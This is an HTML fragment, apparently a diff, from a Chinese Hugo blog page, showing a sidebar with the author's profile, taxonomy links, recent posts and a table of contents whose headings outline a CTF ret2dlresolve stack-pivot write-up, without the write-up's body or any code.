+  <div class="card-header">
+    <h2 class="card-title my-2 fs-4 text-surface">评论</h2>
+  </div>
+  <div class="card-body">
+
+
+
+</div>
+</div></div>
+</div>
+<aside class="col-xxl-4 sidebar d-flex">
+  <div class="container d-flex flex-column">
+    
+    
+<div class="accordion profile">
+  <div class="accordion-item card row text-center component">
+    <div class="accordion-header card-header border-0" id="profile-header">
+      <a
+        class="accordion-button d-lg-none mb-2 shadow-none p-0 bg-transparent text-surface"
+        role="button" data-bs-toggle="collapse" href="#profile" aria-expanded="true" aria-controls="profile">
+        Profile
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="profile" aria-labelledby="profile-header">
+      <div class="col-12 d-flex align-items-center justify-content-center"><img
+  class="profile-avatar rounded-circle"
+  alt="微风的龙"
+  src="/images/profile.png"
+  loading="lazy"
+  data-viewer-invisible
+></div>
+      <div class="col-12 profile-meta"><div class="profile-name fw-fold fs-lg">微风的龙</div>
+<div class="profile-bio">哈基龙的博客，随便看看</div><div class="profile-location"><i class="fas fa-fw fa-map-marker-alt"></i>China</div><a class="profile-about" target="_blank" rel="noopener noreferrer" href="https://github.com/weifengdel0ng"><i class="fas fa-fw fa-user"></i>关于我</a></div>
+
+
+<nav class="social-links nav justify-content-center mt-1 justify-content-around">
+      <a class="nav-link social-link" target="_blank" href="https://github.com/weifengdel0ng" title="GitHub" rel="me">
+        <i class="fa-fw fa-2x fab fa-github"
+          ></i>
+      </a>
+  <a class="nav-link social-link" target="_blank" data-rss-feed href="https://weifengdel0ng.github.io/buu/%E7%AC%AC%E4%B8%80%E9%A1%B5/harekazectf2019baby_rop2/%E9%99%84%E4%BB%B6/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  </div>
+</div>
+
+
+<div class="accordion taxonomies-toggle">
+    <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+            <a
+                class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+                role="button" data-bs-toggle="collapse" href="#taxonomies-toggle" aria-expanded="true" aria-controls="taxonomies-toggle">
+                Taxonomies
+            </a>
+        </div>
+        <div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id="taxonomies-toggle">
+            <ul class="nav nav-pills nav-fill" role="tablist">
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link active" id="taxonomyCategoriesTab" data-bs-toggle="tab" data-bs-target="#taxonomyCategories" 
+                            type="button" role="tab" aria-controls="taxonomyCategories" aria-selected="true">
+                            分类
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="taxonomyTagsTab" data-bs-toggle="tab" data-bs-target="#taxonomyTags" 
+                            type="button" role="tab" aria-controls="taxonomyTags" aria-selected="true">
+                            标签
+                        </button>
+                    </li>
+                <li class="nav-item" role="presentation">
+                    <button class="nav-link" id="taxonomyArchivesTab" data-bs-toggle="tab" data-bs-target="#taxonomyArchives" 
+                        type="button" role="tab" aria-controls="taxonomyArchives" aria-selected="true">
+                        归档
+                    </button>
+                </li>
+            </ul>
+            
+            <div class="tab-content mt-3">
+                    <div class="tab-pane active" id="taxonomyCategories" role="tabpanel" aria-labelledby="taxonomyCategoriesTab" tabindex="0">
+                        <a href="/categories/buu/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="BUU">
+                            BUU
+                        </a>
+                        <a href="/categories/%E4%B8%93%E9%A2%98/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="专题">
+                            专题
+                        </a>
+                        <a href="/categories/%E5%BB%BA%E7%AB%99/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title="建站">
+                            建站
+                        </a>
+                    </div>
+                    <div class="tab-pane" id="taxonomyTags" role="tabpanel" aria-labelledby="taxonomyTagsTab" tabindex="0">
+                        <a href="/tags/buu/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="BUU">
+                            BUU
+                        </a>
+                        <a href="/tags/blog/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Blog">
+                            Blog
+                        </a>
+                        <a href="/tags/github-pages/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="GitHub Pages">
+                            GitHub Pages
+                        </a>
+                        <a href="/tags/hugo/" class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Hugo">
+                            Hugo
+                        </a>
+                    </div>
+                <div class="tab-pane" id="taxonomyArchives" role="tabpanel" aria-labelledby="taxonomyArchivesTab" tabindex="0">
+
+    <a href="" class="btn btn-sm btn-secondary post-taxonomy ps-3 me-2 mb-2" title="2026">
+    2026 <span class="badge badge-sm text-secondary bg-white ms-1">2</span>
+    </a>
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="accordion posts-toggle">
+      <div class="row card component accordion-item">
+        <div class="accordion-header card-header border-0">
+          <a
+            class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent"
+            role="button"
+            data-bs-toggle="collapse"
+            href="#posts-toggle"
+            aria-expanded="true"
+            aria-controls="posts-toggle">
+            文章
+          </a>
+        </div>
+        <div
+          class="card-body collapse accordion-collapse accordion-body d-lg-block show"
+          id="posts-toggle">
+          <ul class="nav nav-pills nav-fill" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link active"
+                  id="recent-posts-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#recent-posts"
+                  type="button"
+                  role="tab"
+                  aria-controls="recent-posts"
+                  aria-selected="true">
+                  最近文章
+                </button>
+              </li>
+          </ul>
+
+          <div class="tab-content mt-3">
+              <div
+                class="tab-pane active"
+                id="recent-posts"
+                role="tabpanel"
+                aria-labelledby="recent-posts-tab"
+                tabindex="0">
+                <ul class="post-list list-unstyled ms-1">
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/hello-hugo/">
+        博客已上线
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          April 27, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                    <li class="mb-2">
+  <div class="d-flex">
+    <div
+      class="flex-grow-1 d-flex flex-column h-auto justify-content-center">
+      <a class="post-title" href="/posts/buu/">
+        BUU
+      </a>
+      <div class="post-meta mt-2">
+        <span class="post-date">
+          April 27, 2026
+        </span>
+      </div>
+    </div>
+  </div>
+                    </li>
+                </ul>
+              </div>
+          </div>
+        </div>
+      </div>
+    </div>
+<div class="accordion post-toc d-none d-lg-block">
+  <div class="accordion-item row mb-4 card component" id="postTOC">
+    <div class="card-header accordion-header">
+      <h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">目录</h2>
+      <a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role="button" data-bs-toggle="collapse" href="#post-toc" aria-expanded="false" aria-controls="post-toc">
+        目录
+      </a>
+    </div>
+    <div class="card-body collapse accordion-collapse accordion-body d-lg-block" id="post-toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#题目信息">题目信息</a></li>
+    <li><a href="#一程序分析">一、程序分析</a></li>
+    <li><a href="#二漏洞点分析">二、漏洞点分析</a></li>
+    <li><a href="#三覆盖偏移计算">三、覆盖偏移计算</a></li>
+    <li><a href="#四为什么选择-ret2dlresolve">四、为什么选择 ret2dlresolve</a></li>
+    <li><a href="#五利用思路总览">五、利用思路总览</a>
+      <ul>
+        <li><a href="#第一阶段">第一阶段</a></li>
+        <li><a href="#第二阶段">第二阶段</a></li>
+      </ul>
+    </li>
+    <li><a href="#六关键地址整理">六、关键地址整理</a></li>
+    <li><a href="#七第一阶段栈迁移">七、第一阶段：栈迁移</a>
+      <ul>
+        <li><a href="#1-为什么要栈迁移">1. 为什么要栈迁移</a></li>
+        <li><a href="#2-第一阶段-rop">2. 第一阶段 ROP</a></li>
+      </ul>
+    </li>
+    <li><a href="#八第二阶段ret2dlresolve-原理">八、第二阶段：ret2dlresolve 原理</a></li>
+    <li><a href="#九ret2dlresolve-需要伪造什么">九、ret2dlresolve 需要伪造什么</a>
+      <ul>
+        <li><a href="#1-伪造重定位表项-elf32_rel">1. 伪造重定位表项 <code>Elf32_Rel</code></a></li>
+        <li><a href="#2-伪造符号表项-elf32_sym">2. 伪造符号表项 <code>Elf32_Sym</code></a></li>
+        <li><a href="#3-伪造字符串-systemx00">3. 伪造字符串 <code>&#34;system\x00&#34;</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#十对齐问题">十、对齐问题</a></li>
+    <li><a href="#十一第二阶段-payload-构造">十一、第二阶段 payload 构造</a></li>
+    <li><a href="#十二为什么这样布置栈">十二、为什么这样布置栈</a>
+      <ul>
+        <li><a href="#1-plt0">1. <code>PLT0</code></a></li>
+        <li><a href="#2-reloc_arg">2. <code>reloc_arg</code></a></li>
+        <li><a href="#3-system-参数">3. <code>system</code> 参数</a></li>
+      </ul>
+    </li>
+    <li><a href="#十三完整-exp">十三、完整 exp</a></li>
+    <li><a href="#十四利用过程总结">十四、利用过程总结</a></li>
+    <li><a href="#十五这题的考点">十五、这题的考点</a>
+      <ul>
+        <li><a href="#1-栈溢出基础">1. 栈溢出基础</a></li>
+        <li><a href="#2-nx-开启后的利用方式">2. NX 开启后的利用方式</a></li>
+        <li><a href="#3-栈迁移">3. 栈迁移</a></li>
+        <li><a href="#4-ret2dlresolve">4. ret2dlresolve</a></li>
+      </ul>
+    </li>
+    <li><a href="#十六易错点">十六、易错点</a>
+      <ul>
+        <li><a href="#1-第一阶段长度">1. 第一阶段长度</a></li>
+        <li><a href="#2-第二阶段长度">2. 第二阶段长度</a></li>
+        <li><a href="#3-elf32_sym-对齐">3. <code>Elf32_Sym</code> 对齐</a></li>
+        <li><a href="#4-r_info-计算">4. <code>r_info</code> 计算</a></li>
+        <li><a href="#5-reloc_arg">5. <code>reloc_arg</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#十七最终结果">十七、最终结果</a></li>
+    <li><a href="#十八附一句话总结">十八、附：一句话总结</a></li>
+  </ul>
+</nav>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+  </div>
+</aside>
+
+      </div>
+    </main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex="-1" id="offcanvasActionsPanel"
+  aria-labelledby="offcanvasActionsPanelLabel">
+  <div class="offcanvas-header">
+    <div class="offcanvas-title h5" id="offcanvasActionsPanelLabel">
+      <i class="fas fa-fw fa-th-large me-1"></i>
+      操作
+    </div>
+    <button type="button" class="btn-close ms-auto" data-bs-dismiss="offcanvas" data-bs-target="offcanvasActionsPanel" aria-label="Close"></button>
+  </div>
+  <div class="offcanvas-body mt-2"><div class="actions d-flex overflow-auto align-items-center">
+      <a role="button" class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i></span> 返回
+      </a>
+      <a role="button" class="action action-reload-page d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> 刷新
+      </a>
+      <a role="button" class="action action-copy-url d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> 复制链接
+      </a>
+    </div>
+  </div>
+</div><div class="row text-center">
+  <div class="col-12 mt-2">
+    <p class="mb-2">微风的龙</p>
+    <p class="text-secondary mb-2"><small>微风的龙的个人博客，记录技术、项目和思考。</small></p><div class="copyright mb-2 text-secondary">
+  <small>
+</small>
+</div>
+<div class="powered-by mb-2 text-secondary">
+  <small>
+    Build with ❤️ from the <a class="text-primary" href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a class="text-primary" href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">HBS</a> theme.
+  </small>
+</div>
+
+
+<nav class="social-links nav justify-content-center mb-2 mt-3">
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="https://weifengdel0ng.github.io/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
+</div>
+</footer>
+<script data-precache src="/assets/main/bundle.min.3de74a0b978ed64b15f6e0d25d913177adc77cae61692b679df48c3036ac2c49.js" integrity="sha256-PedKC5eO1ksV9uDSXZExd63HfK5haStnnfSMMDasLEk=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.2afb6643b7cdde837754668abae3dceedc993b71ebefe8bc9c80af3e2e349075.js" integrity="sha256-KvtmQ7fN3oN3VGaKuuPc7tyZO3Hr7&#43;i8nICvPi40kHU=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/viewer/bundle.min.13800f940d1d83422ff174b45ece49c4c58a17a608fe79bdba39aec874d4c7fe.js" integrity="sha256-E4APlA0dg0Iv8XS0Xs5JxMWKF6YI/nm9ujmuyHTUx/4=" crossorigin="anonymous" defer></script>
+
+
+  </body>
+</html>
